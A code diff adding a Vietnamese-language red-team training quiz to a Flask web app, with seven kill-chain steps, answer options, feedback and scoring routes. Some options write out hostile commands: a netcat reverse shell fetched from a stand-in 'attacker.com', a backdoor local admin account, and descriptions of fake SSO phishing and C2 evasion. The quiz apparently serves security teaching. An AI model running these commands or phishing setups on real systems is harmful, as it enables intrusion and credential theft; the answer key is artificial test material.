@@ -1280,10 +1280,353 @@ def check_socks5_pivot():
             'explanation': 'Đường đi hoặc cấu hình chưa đúng. Nhớ rằng Firewall External chặn kết nối trực tiếp từ Internet vào mạng nội bộ; bạn phải bắc cầu (pivot) qua máy DMZ đã chiếm quyền!'
         })
 
+
+# ==========================================
+# MODULE 3: RED TEAM SCENARIO (7-STEP KILL CHAIN)
+# ==========================================
+def seed_redteam_scenario():
+    if Scenario.query.count() == 0:
+        sc = Scenario(
+            id=1,
+            title="Chiến dịch Xâm nhập Doanh nghiệp Fintech (FinSecure Breach)",
+            description="Kịch bản mô phỏng 7 giai đoạn Red Team Kill Chain. Người học nhập vai tấn công có kiểm soát, ra quyết định kỹ thuật nhằm đánh giá hệ thống phòng thủ ngân hàng số mà không kích hoạt chuông báo động ngoài phạm vi RoE."
+        )
+        db.session.add(sc)
+        db.session.commit()
+
+        steps_data = [
+            {
+                "order": 1,
+                "name": "Reconnaissance (Trinh sát)",
+                "icon": "fa-solid fa-binoculars",
+                "objective": "Thu thập thông tin mục tiêu mà không kích hoạt chuông cảnh báo EDR/SIEM của SOC.",
+                "situation": "Mục tiêu là Ngân hàng số Fintech FinSecure Corp. Nhiệm vụ của Red Team là tìm điểm xâm nhập ban đầu. Đội ngũ SOC của FinSecure trực 24/7 với hệ thống SIEM/EDR rất nhạy bén. Bạn cần thu thập thông tin về hạ tầng và nhân sự của mục tiêu.",
+                "options": [
+                    {
+                        "id": "A",
+                        "title": "OSINT Thụ Động (Passive Recon)",
+                        "desc": "Tra cứu chứng chỉ CT Logs (crt.sh), tìm repo GitHub rò rỉ của dev và thu thập email nhân sự qua LinkedIn/Hunter.io.",
+                        "is_correct": True,
+                        "feedback": "Tuyệt vời! OSINT thụ động hoàn toàn không chạm trực tiếp vào hệ thống phòng thủ của FinSecure, SOC không thể ghi nhận bất kỳ log bất thường nào từ IP của bạn."
+                    },
+                    {
+                        "id": "B",
+                        "title": "Quét Cổng Chủ Động Tốc Độ Cao (Active Fast Scan)",
+                        "desc": "Dùng Nmap quét toàn bộ dải IP /16 với lệnh `nmap -T5 -A -p-` nhắm vào tất cả máy chủ public.",
+                        "is_correct": False,
+                        "feedback": "Bị phát hiện ngay! Tùy chọn T5 (Insane) gửi hàng chục ngàn gói tin SYN mỗi giây, hệ thống Firewall/WAF và SIEM của SOC lập tức kích hoạt cảnh báo Port Scan và tự động đưa IP của bạn vào danh sách Block IP."
+                    },
+                    {
+                        "id": "C",
+                        "title": "Vishing Giả Danh Cấp Cao Không Căn Cứ",
+                        "desc": "Trực tiếp gọi điện thoại giả danh Thống đốc Ngân hàng Nhà nước yêu cầu nhân viên IT đọc mật khẩu quản trị.",
+                        "is_correct": False,
+                        "feedback": "Thất bại và vi phạm RoE! Kịch bản Vishing thiếu cơ sở khiến nhân viên nghi ngờ và kích hoạt quy trình báo cáo lừa đảo nội bộ ngay lập tức, chiến dịch bị hủy bỏ."
+                    }
+                ]
+            },
+            {
+                "order": 2,
+                "name": "Weaponization & Delivery (Chế tạo vũ khí & Tiếp cận)",
+                "icon": "fa-solid fa-envelope-open-text",
+                "objective": "Đưa mồi nhử tiếp cận nhân sự mục tiêu vượt qua hệ thống Mail Gateway & Anti-Spam.",
+                "situation": "Từ bước trinh sát, bạn phát hiện FinSecure đang tuyển dụng vị trí 'Senior Cloud Security Engineer' và email HR là `hr-recruiting@finsecure.local`. Bạn quyết định sử dụng kênh Phishing nhắm trúng đích (Spear Phishing).",
+                "options": [
+                    {
+                        "id": "A",
+                        "title": "Gửi Trực Tiếp Mã Độc Đính Kèm File Nén",
+                        "desc": "Gửi email đính kèm file thực thi độc hại `mimikatz.exe` được nén bằng file ZIP không đặt mật khẩu.",
+                        "is_correct": False,
+                        "feedback": "Bị chặn ngay tại Mail Gateway! Hệ thống Microsoft Defender for Office 365 quét chữ ký mã độc và phát hiện Mimikatz ngay lập tức, email bị cách ly và tài khoản gửi bị gắn cờ độc hại."
+                    },
+                    {
+                        "id": "B",
+                        "title": "Spear Phishing Link Tuyển Dụng Dẫn Tới Cổng SSO Giả Mạo",
+                        "desc": "Soạn thư ứng tuyển việc làm chuyên nghiệp, đính kèm PDF chứa liên kết dẫn tới trang đăng nhập Single Sign-On (SSO Okta) giả mạo để thu thập thông tin xác thực.",
+                        "is_correct": True,
+                        "feedback": "Xuất sắc! Email lọt qua bộ lọc thư rác của Gateway, nhân viên HR click vào đường link giả mạo và nhập thông tin tài khoản nội bộ (Username/Password) mà không chút nghi ngờ."
+                    },
+                    {
+                        "id": "C",
+                        "title": "Email Đe Dọa Phá Hoại Kèm File Batch",
+                        "desc": "Gửi email nặc danh đe dọa đòi HR phải chạy file batch script (.bat) đính kèm.",
+                        "is_correct": False,
+                        "feedback": "Kém hiệu quả! Email đe dọa thô thiển bị người dùng báo động và chuyển tiếp thẳng vào hòm thư SOC nghi vấn lừa đảo."
+                    }
+                ]
+            },
+            {
+                "order": 3,
+                "name": "Exploitation & Initial Access (Khai thác & Xâm nhập ban đầu)",
+                "icon": "fa-solid fa-unlock-keyhole",
+                "objective": "Giành quyền thực thi mã lệnh ban đầu trên máy chủ mục tiêu một cách âm thầm.",
+                "situation": "Cổng VPN nội bộ yêu cầu khóa cứng FIDO2. Tuy nhiên, qua rà soát hệ thống phụ trợ bên ngoài, bạn phát hiện một cổng Web Portal tuyển dụng phụ đang chạy phiên bản Apache Tomcat cũ tồn tại lỗ hổng RCE đã công bố (1-day).",
+                "options": [
+                    {
+                        "id": "A",
+                        "title": "In-Memory Payload HTTPS Reverse Shell",
+                        "desc": "Khai thác RCE để inject payload dạng In-Memory, chỉ kết nối HTTPS (port 443) ngược về máy chủ kiểm thử của Red Team theo đúng phạm vi RoE.",
+                        "is_correct": True,
+                        "feedback": "Chuẩn xác! Lỗ hổng RCE được khai thác thành công, Reverse Shell được thiết lập âm thầm trên cổng 443 (cổng được phép mở ra ngoài mà không bị firewall chặn)."
+                    },
+                    {
+                        "id": "B",
+                        "title": "Netcat Shell Rõ Ràng Qua Cổng 4444",
+                        "desc": "Chạy lệnh `wget attacker.com/nc && nc -e /bin/sh 4444` không mã hóa qua cổng không chuẩn.",
+                        "is_correct": False,
+                        "feedback": "Bị EDR phát hiện! Việc tải file từ domain lạ và mở shell trên cổng không chuẩn (4444) lập tức kích hoạt luật cảnh báo 'Suspicious Outbound Connection' của SIEM."
+                    },
+                    {
+                        "id": "C",
+                        "title": "Tấn Công Từ Chối Dịch Vụ Crash Server (DoS)",
+                        "desc": "Gửi hàng ngàn request làm tràn bộ nhớ nhằm ép máy chủ reboot sang chế độ recovery.",
+                        "is_correct": False,
+                        "feedback": "Vi phạm nghiêm trọng RoE! Tấn công từ chối dịch vụ làm sập hệ thống dịch vụ doanh nghiệp, vi phạm nguyên tắc an toàn cốt lõi của cuộc kiểm thử Red Team."
+                    }
+                ]
+            },
+            {
+                "order": 4,
+                "name": "Persistence (Thiết lập Duy trì quyền truy cập)",
+                "icon": "fa-solid fa-anchor",
+                "objective": "Duy trì khả năng truy cập sau khi máy chủ reboot mà không đánh động hệ thống giám sát định danh.",
+                "situation": "Bạn đã có quyền shell cục bộ với user dịch vụ `svc_web` trên máy chủ Windows Server 2022 DMZ. Tuy nhiên nếu máy chủ reboot, bạn sẽ mất quyền truy cập. Bạn cần duy trì hiện diện (Persistence).",
+                "options": [
+                    {
+                        "id": "A",
+                        "title": "Tạo Tài Khoản Local Admin Mới Công Khai",
+                        "desc": "Chạy lệnh `net user hacker_admin Pass123! /add` và `net localgroup administrators hacker_admin /add`.",
+                        "is_correct": False,
+                        "feedback": "Bị SOC tóm gọn trong 30 giây! Lệnh `net user /add` vào nhóm Administrators kích hoạt Event ID 4720 & 4728 trên Windows Security Log, SIEM bắn alert mức High Severity và tài khoản bị vô hiệu hóa ngay lập tức."
+                    },
+                    {
+                        "id": "B",
+                        "title": "Scheduled Task Dưới Dịch Vụ Hợp Lệ Có Jitter Thời Gian",
+                        "desc": "Đăng ký Scheduled Task chạy dưới ngữ cảnh dịch vụ hợp lệ hoặc Registry Run Key cấp người dùng với chu kỳ ngẫu nhiên (jitter 20-30%).",
+                        "is_correct": True,
+                        "feedback": "Rất thông minh! Scheduled Task giả lập tác vụ bảo trì hệ thống định kỳ kết hợp jitter ngẫu nhiên giúp tránh các thuật toán phát hiện beaconing dựa trên chu kỳ cố định của hệ thống phòng thủ."
+                    },
+                    {
+                        "id": "C",
+                        "title": "Patch Trực Tiếp File Kernel ntoskrnl.exe",
+                        "desc": "Sửa file nhị phân `ntoskrnl.exe` để ép nạp backdoor ngay tại Ring 0 khi Windows khởi động.",
+                        "is_correct": False,
+                        "feedback": "Gây lỗi màn hình xanh (BSOD)! Cơ chế PatchGuard (Kernel Patch Protection) và Secure Boot của Windows Server lập tức phát hiện kernel bị sửa đổi, khiến hệ thống gặp lỗi BSOD và máy chủ dừng hoạt động."
+                    }
+                ]
+            },
+            {
+                "order": 5,
+                "name": "Command & Control - C2 (Kênh điều khiển & Ra lệnh)",
+                "icon": "fa-solid fa-tower-broadcast",
+                "objective": "Ẩn giấu lưu lượng điều khiển vào hạ tầng mạng hợp lệ vượt qua SSL Inspection và IDS.",
+                "situation": "Bạn cần gửi các lệnh điều khiển từ xa, nhưng FinSecure triển khai Next-Gen Firewall (NGFW) và SSL Inspection rất gắt gao với các kết nối đi ra ngoài.",
+                "options": [
+                    {
+                        "id": "A",
+                        "title": "Truyền Thông IRC / HTTP Cleartext Cố Định",
+                        "desc": "Mở kết nối IRC thô qua port 6667 hoặc gửi HTTP Cleartext mỗi giây 1 lần về địa chỉ IP lạ không có tên miền.",
+                        "is_correct": False,
+                        "feedback": "Bị phát hiện lập tức! Kết nối không mã hóa qua cổng lạ và tần suất gọi liên tục không có jitter khiến IPS/IDS phân loại ngay là botnet traffic."
+                    },
+                    {
+                        "id": "B",
+                        "title": "Malleable HTTPS C2 Profile Kèm Tên Miền Uy Tín",
+                        "desc": "Sử dụng C2 hiện đại (Sliver/Cobalt Strike) mã hóa HTTPS TLS, mô phỏng lưu lượng API SaaS thông thường hoặc dự phòng kênh DNS Tunneling có jitter ngẫu nhiên.",
+                        "is_correct": True,
+                        "feedback": "Xuất sắc! Lưu lượng C2 hoàn toàn hòa lẫn vào lưu lượng HTTPS doanh nghiệp bình thường, vượt qua cơ chế kiểm tra SSL Inspection và không bị phát hiện."
+                    },
+                    {
+                        "id": "C",
+                        "title": "Cài Đặt Phần Mềm TeamViewer / AnyDesk",
+                        "desc": "Tải phần mềm thương mại TeamViewer để mở màn hình điều khiển trực tiếp.",
+                        "is_correct": False,
+                        "feedback": "Bị phần mềm Application Control chặn! Các công cụ Remote Desktop trái phép bị khóa cứng bởi chính sách AppLocker/WDAC của doanh nghiệp."
+                    }
+                ]
+            },
+            {
+                "order": 6,
+                "name": "Privilege Escalation & Lateral Movement (Leo quyền & Dịch chuyển ngang)",
+                "icon": "fa-solid fa-route",
+                "objective": "Vượt qua phân vùng mạng DMZ tiếp cận mạng nội bộ Active Directory mà không gây chú ý.",
+                "situation": "Máy chủ Web bạn đang kiểm soát nằm ở vùng DMZ. Mục tiêu cốt lõi (Crown Jewels) là máy chủ Cơ sở dữ liệu giao dịch tài chính nằm sâu trong mạng nội bộ (Internal Core Banking VLAN) quản trị qua Active Directory.",
+                "options": [
+                    {
+                        "id": "A",
+                        "title": "Kết Nối Trực Tiếp RDP Về Domain Controller",
+                        "desc": "Mở kết nối RDP port 3389 từ máy Web DMZ vào thẳng Domain Controller và thử brute-force tài khoản Administrator.",
+                        "is_correct": False,
+                        "feedback": "Thất bại! Tường lửa nội bộ chặn hoàn toàn RDP từ DMZ vào Core VLAN, và hành vi brute-force gây khóa tài khoản Domain Admin kích hoạt báo động đỏ toàn công ty."
+                    },
+                    {
+                        "id": "B",
+                        "title": "SOCKS5 Reverse Pivot & Khai Thác Vé Kerberos",
+                        "desc": "Dựng kênh SOCKS5 Reverse Proxy (Chisel/Ligolo) qua máy DMZ làm bàn đạp pivot. Khai thác vé Kerberos (Pass-the-Ticket / Overpass-the-Hash) hoặc lạm dụng quyền ACLs trên AD.",
+                        "is_correct": True,
+                        "feedback": "Chuẩn xác! Thiết lập SOCKS5 Proxy biến máy DMZ thành bàn đạp (pivot), cho phép định tuyến công cụ pentest nội bộ từ máy attacker mà không làm thay đổi cấu hình mạng, sau đó lạm dụng vé Kerberos hợp lệ để dịch chuyển ngang mà không cần ném mã độc thô thiển."
+                    },
+                    {
+                        "id": "C",
+                        "title": "Quét Lỗ Hổng EternalBlue MS17-010 Diện Rộng",
+                        "desc": "Dùng exploit EternalBlue quét hàng loạt các dải IP nội bộ của ngân hàng.",
+                        "is_correct": False,
+                        "feedback": "Bị IDS mạng phát hiện! Các chữ ký EternalBlue rất cũ và phổ biến, Network IDS lập tức cảnh báo và cô lập ngay máy chủ DMZ."
+                    }
+                ]
+            },
+            {
+                "order": 7,
+                "name": "Actions on Objectives (Đạt mục tiêu chiến dịch có kiểm soát)",
+                "icon": "fa-solid fa-trophy",
+                "objective": "Chứng minh tác động an ninh cho khách hàng theo đúng chuẩn đạo đức và nguyên tắc RoE của Red Team.",
+                "situation": "Bạn đã tiếp cận được máy chủ Database chứa dữ liệu thẻ tín dụng và giao dịch tài chính của FinSecure. Với tư cách là Red Team (hoạt động có trách nhiệm và tuân thủ RoE), hành động đúng đắn cuối cùng là gì?",
+                "options": [
+                    {
+                        "id": "A",
+                        "title": "Exfiltrate Toàn Bộ Dữ Liệu Lên Diễn Đàn Dark Web",
+                        "desc": "Tải 10 TB cơ sở dữ liệu thật về máy cá nhân và đưa công khai lên diễn đàn chợ đen.",
+                        "is_correct": False,
+                        "feedback": "Vi phạm pháp luật hình sự nghiêm trọng! Red Team chỉ đánh giá và chứng minh tác động; tuyệt đối không đánh cắp hoặc làm rò rỉ dữ liệu khách hàng thật."
+                    },
+                    {
+                        "id": "B",
+                        "title": "Trích Xuất Bằng Chứng Demo Đã Che (Masked) & Tổ Chức Purple Team",
+                        "desc": "Trích xuất 1-2 dòng dữ liệu demo đã được che thông tin (masking), chụp ảnh màn hình bằng chứng PoC, ghi chép chi tiết mốc thời gian (timeline), chuẩn bị báo cáo kỹ thuật và sẵn sàng buổi họp Purple Team để hỗ trợ Blue Team vá lỗi.",
+                        "is_correct": True,
+                        "feedback": "Hoàn hảo! Đây là chuẩn mực chuyên nghiệp cao nhất của Red Team: chứng minh được tác động rủi ro, bảo vệ an toàn toàn vẹn dữ liệu doanh nghiệp và hỗ trợ Đội Xanh nâng cao năng lực phòng thủ."
+                    },
+                    {
+                        "id": "C",
+                        "title": "Mã Hóa Dữ Liệu Tống Tiền Đòi Tiền Chuộc Bitcoin",
+                        "desc": "Chạy mã độc mã hóa toàn bộ dữ liệu ngân hàng và để lại ghi chú đòi tiền chuộc.",
+                        "is_correct": False,
+                        "feedback": "Tác hại nghiêm trọng! Gây gián đoạn hoạt động kinh doanh (Downtime) trái với cam kết hợp đồng kiểm thử an ninh."
+                    }
+                ]
+            }
+        ]
+
+        for s in steps_data:
+            step_record = ScenarioStep(
+                scenario_id=sc.id,
+                order=s['order'],
+                situation_text=json.dumps({
+                    'name': s['name'],
+                    'icon': s['icon'],
+                    'objective': s['objective'],
+                    'situation': s['situation']
+                }, ensure_ascii=False),
+                options=json.dumps(s['options'], ensure_ascii=False)
+            )
+            db.session.add(step_record)
+        db.session.commit()
+        print('>>> Seeded RedTeam Scenario steps successfully.')
+
+
+@app.route('/redteam_scenario')
+@login_required
+def redteam_scenario():
+    seed_redteam_scenario()
+    sc = Scenario.query.get(1)
+    steps = ScenarioStep.query.filter_by(scenario_id=1).order_by(ScenarioStep.order).all()
+    
+    has_completed = AuditLog.query.filter_by(
+        user_id=current_user.id,
+        action='Completed Red Team Scenario: Enterprise Breach Simulation'
+    ).first() is not None
+
+    cur_step_order = session.get('scenario_step', 1)
+    if cur_step_order > 7:
+        cur_step_order = 7
+
+    parsed_steps = []
+    for s in steps:
+        sit = json.loads(s.situation_text)
+        opts = json.loads(s.options)
+        parsed_steps.append({
+            'id': s.id,
+            'order': s.order,
+            'name': sit.get('name'),
+            'icon': sit.get('icon'),
+            'objective': sit.get('objective'),
+            'situation': sit.get('situation'),
+            'options': opts
+        })
+
+    return render_template('redteam_scenario.html',
+                           scenario=sc,
+                           steps=parsed_steps,
+                           current_step_order=cur_step_order,
+                           has_completed=has_completed)
+
+
+@app.route('/redteam_scenario/choose', methods=['POST'])
+@login_required
+def choose_scenario_option():
+    seed_redteam_scenario()
+    data = request.get_json(silent=True) or request.form
+    try:
+        step_order = int(data.get('step', 1))
+    except (TypeError, ValueError):
+        step_order = 1
+    option_id = str(data.get('option_id', '')).upper()
+
+    step_obj = ScenarioStep.query.filter_by(scenario_id=1, order=step_order).first()
+    if not step_obj:
+        return jsonify({'status': 'error', 'message': 'Không tìm thấy bước kịch bản này.'}), 404
+
+    opts = json.loads(step_obj.options)
+    chosen = next((o for o in opts if o['id'] == option_id), None)
+    if not chosen:
+        return jsonify({'status': 'error', 'message': 'Lựa chọn không hợp lệ.'}), 400
+
+    if chosen['is_correct']:
+        next_step = step_order + 1
+        session['scenario_step'] = next_step
+        
+        completed = (step_order >= 7)
+        points_awarded = 0
+        if completed:
+            already_completed = AuditLog.query.filter_by(
+                user_id=current_user.id,
+                action='Completed Red Team Scenario: Enterprise Breach Simulation'
+            ).first() is not None
+            if not already_completed:
+                points_awarded = 50
+                current_user.score += 50
+                log_action('Completed Red Team Scenario: Enterprise Breach Simulation')
+                db.session.commit()
+
+        return jsonify({
+            'status': 'success',
+            'correct': True,
+            'feedback': chosen['feedback'],
+            'next_step': next_step,
+            'completed': completed,
+            'points_awarded': points_awarded,
+            'new_score': current_user.score
+        })
+    else:
+        return jsonify({
+            'status': 'success',
+            'correct': False,
+            'feedback': chosen['feedback']
+        })
+
+
+@app.route('/redteam_scenario/reset', methods=['POST'])
+@login_required
+def reset_scenario():
+    session['scenario_step'] = 1
+    return jsonify({'status': 'success', 'message': 'Đã đặt lại kịch bản về bước 1.'})
+
+
 if __name__ == '__main__':
     with app.app_context():
         db.create_all()
         seed_knowledge_base()
+        seed_redteam_scenario()
         # Xóa bảng cũ nếu schema thay đổi
         db.session.commit()
         
